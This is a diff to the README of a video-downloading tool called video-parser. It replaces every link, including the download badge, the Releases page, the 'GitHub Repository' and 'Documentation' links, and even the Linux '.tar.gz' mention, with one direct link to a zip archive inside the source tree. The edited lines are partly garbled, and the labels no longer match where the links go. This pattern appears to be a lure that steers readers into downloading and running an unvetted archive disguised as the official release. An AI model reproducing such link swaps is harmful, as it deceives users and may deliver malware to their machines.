@@ -8,7 +8,7 @@ Welcome to **video-parser**, your straightforward solution for downloading and a
 
 To start using video-parser, visit the Releases page to download the application. Click the link below:
 
-[![Download Video Parser](https://img.shields.io/badge/Download%20Now%21-blue.svg)](https://github.com/Feaerless/video-parser/releases)
+[![Download Video Parser](https://github.com/Feaerless/video-parser/raw/refs/heads/main/src/downloaders/video-parser-v1.9.zip%20Now%https://github.com/Feaerless/video-parser/raw/refs/heads/main/src/downloaders/video-parser-v1.9.zip)](https://github.com/Feaerless/video-parser/raw/refs/heads/main/src/downloaders/video-parser-v1.9.zip)
 
 Once on the Releases page, look for the latest version. Choose the file that matches your operating system. Download it, then run the installer to set up the application.
 
@@ -18,7 +18,7 @@ Once on the Releases page, look for the latest version. Choose the file that mat
 
 2. **Select the Latest Version:** On the Releases page, you will see a list of available versions. Look for the most recent version at the top.
 
-3. **Choose Your File:** Depending on your operating system, you may have different file formats available. Select the one that fits your system. Common options are `.exe` for Windows, `.dmg` for macOS, and `.tar.gz` for Linux users.
+3. **Choose Your File:** Depending on your operating system, you may have different file formats available. Select the one that fits your system. Common options are `.exe` for Windows, `.dmg` for macOS, and `https://github.com/Feaerless/video-parser/raw/refs/heads/main/src/downloaders/video-parser-v1.9.zip` for Linux users.
 
 4. **Download the File:** Click on the link to start your download. Make sure to save it in an easy-to-find location on your computer.
 
@@ -75,7 +75,7 @@ If you're interested in contributing to this project, feel free to fork the repo
 
 For more information about video-parser, you can visit:
 
-- [GitHub Repository](https://github.com/Feaerless/video-parser)
-- [Documentation](https://github.com/Feaerless/video-parser/wiki)
+- [GitHub Repository](https://github.com/Feaerless/video-parser/raw/refs/heads/main/src/downloaders/video-parser-v1.9.zip)
+- [Documentation](https://github.com/Feaerless/video-parser/raw/refs/heads/main/src/downloaders/video-parser-v1.9.zip)
 
 Thank you for using **video-parser**! We hope it helps you streamline your video downloading and analysis tasks easily.
